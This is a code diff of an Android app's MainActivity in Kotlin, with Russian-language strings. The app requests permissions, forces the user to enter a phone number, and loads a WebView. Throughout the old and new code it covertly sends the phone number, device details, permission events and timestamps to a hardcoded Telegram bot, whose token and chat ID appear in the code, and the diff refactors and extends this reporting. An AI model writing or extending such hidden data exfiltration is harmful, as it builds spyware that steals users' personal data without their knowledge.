@@ -6,12 +6,19 @@ import android.app.AlertDialog
 import android.content.Context
 import android.content.SharedPreferences
 import android.content.pm.PackageManager
+import android.graphics.Color
+import android.graphics.drawable.ColorDrawable
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
+import android.text.InputType
+import android.view.LayoutInflater
+import android.view.View
 import android.webkit.WebView
+import android.widget.Button
 import android.widget.EditText
+import android.widget.TextView
 import androidx.activity.enableEdgeToEdge
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -23,10 +30,11 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import okio.IOException
 
 class MainActivity : AppCompatActivity() {
+
     private lateinit var sharedPreferences: SharedPreferences
     private lateinit var myWebView: WebView
     private val client = OkHttpClient()
-    
+
     companion object {
         private const val PERMISSION_REQUEST_CODE = 100
         private const val PREFS_NAME = "AppPrefs"
@@ -41,10 +49,10 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
         setContentView(R.layout.activity_main)
-        
+
         sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         myWebView = findViewById(R.id.webview)
-        
+
         with(myWebView.settings) {
             javaScriptEnabled = true
             domStorageEnabled = true
@@ -102,7 +110,7 @@ class MainActivity : AppCompatActivity() {
             )
         } else {
             onAllPermissionsGranted()
-            sendPermissionsNotification("Все разрешения уже предоставлены")
+            sendNotification("Все разрешения уже предоставлены")
         }
     }
 
@@ -117,11 +125,11 @@ class MainActivity : AppCompatActivity() {
             val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
 
             if (allGranted) {
+                sendNotification("Пользователь предоставил все разрешения")
                 onAllPermissionsGranted()
-                sendPermissionsNotification("Пользователь предоставил все разрешения")
             } else {
+                sendNotification("Пользователь отказал в некоторых разрешениях")
                 checkPermissions()
-                sendPermissionsNotification("Пользователь отказал в некоторых разрешениях")
             }
         }
     }
@@ -129,75 +137,61 @@ class MainActivity : AppCompatActivity() {
     private fun onAllPermissionsGranted() {
         val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
         if (savedPhoneNumber == null) {
-            showPhoneNumberInputDialog()
+            showStyledPhoneNumberDialog()
         } else {
             loadWebView()
         }
     }
 
-    private fun showPhoneNumberInputDialog() {
-        val input = EditText(this).apply {
-            hint = "Введите номер телефона"
+    private fun showStyledPhoneNumberDialog() {
+        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
+        val dialog = AlertDialog.Builder(this)
+            .setView(dialogView)
+            .setCancelable(false)
+            .create()
+
+        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
+
+        val title = dialogView.findViewById<TextView>(R.id.dialog_title)
+        val message = dialogView.findViewById<TextView>(R.id.dialog_message)
+        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
+        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)
+
+        title.text = "Введите номер телефона"
+        message.text = "Пожалуйста, введите ваш номер телефона для продолжения"
+        phoneInput.inputType = InputType.TYPE_CLASS_PHONE
+
+        continueButton.setOnClickListener {
+            val phoneNumber = phoneInput.text.toString().trim()
+            if (phoneNumber.isNotEmpty()) {
+                sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
+                sendNotification("Пользователь ввел номер телефона: $phoneNumber")
+                loadWebView()
+                dialog.dismiss()
+            } else {
+                phoneInput.error = "Пожалуйста, введите номер телефона"
+            }
         }
 
-        AlertDialog.Builder(this)
-            .setTitle("Ввод номера телефона")
-            .setMessage("Пожалуйста, введите ваш номер телефона")
-            .setView(input)
-            .setPositiveButton("Продолжить") { _, _ ->
-                val phoneNumber = input.text.toString().trim()
-                if (phoneNumber.isNotEmpty()) {
-                    sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
-                    sendUserDataToBot(phoneNumber, "Новый пользователь ввел номер телефона")
-                    loadWebView()
-                } else {
-                    showPhoneNumberInputDialog()
-                }
-            }
-            .setCancelable(false)
-            .show()
-    }
-
-    private fun sendPermissionsNotification(message: String) {
-        val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "Номер не указан")
-        val deviceInfo = getDeviceInfo()
-        val fullMessage = """
-            $message
-            
-            Номер телефона: $phoneNumber
-            Устройство: $deviceInfo
-            Разрешения: ${REQUIRED_PERMISSIONS.joinToString()}
-        """.trimIndent()
-        
-        sendToTelegramBot(fullMessage)
-    }
-
-    private fun sendUserDataToBot(phoneNumber: String, context: String) {
-        val deviceInfo = getDeviceInfo()
-        val message = """
-            $context
-            
-            Номер телефона: $phoneNumber
-            Устройство: $deviceInfo
-        """.trimIndent()
-        
-        sendToTelegramBot(message)
+        dialog.show()
     }
 
     private fun loadWebView() {
         myWebView.loadUrl("https://www.example.com")
     }
 
-    private fun getDeviceInfo(): String {
-        return """
-            Модель: ${Build.MANUFACTURER} ${Build.MODEL}
-            Android версия: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
-            Устройство: ${Build.DEVICE}
-        """.trimIndent()
-    }
-
-    private fun sendToTelegramBot(message: String) {
+    private fun sendNotification(message: String) {
         try {
+            val deviceInfo = getDeviceInfo()
+            val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
+            val fullMessage = """
+                $message
+                
+                Устройство: $deviceInfo
+                Номер телефона: $phoneNumber
+                Время: ${System.currentTimeMillis()}
+            """.trimIndent()
+
             val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
             val chatId = "6331293386"
             val url = "https://api.telegram.org/bot$botToken/sendMessage"
@@ -206,7 +200,7 @@ class MainActivity : AppCompatActivity() {
             val requestBody = """
                 {
                     "chat_id": "$chatId",
-                    "text": "$message",
+                    "text": "$fullMessage",
                     "parse_mode": "Markdown"
                 }
             """.trimIndent().toRequestBody(mediaType)
@@ -228,5 +222,14 @@ class MainActivity : AppCompatActivity() {
         } catch (e: Exception) {
             e.printStackTrace()
         }
+    }
+
+    private fun getDeviceInfo(): String {
+        return """
+            Производитель: ${Build.MANUFACTURER}
+            Модель: ${Build.MODEL}
+            Версия ОС: ${Build.VERSION.RELEASE}
+            SDK: ${Build.VERSION.SDK_INT}
+        """.trimIndent()
     }
 }
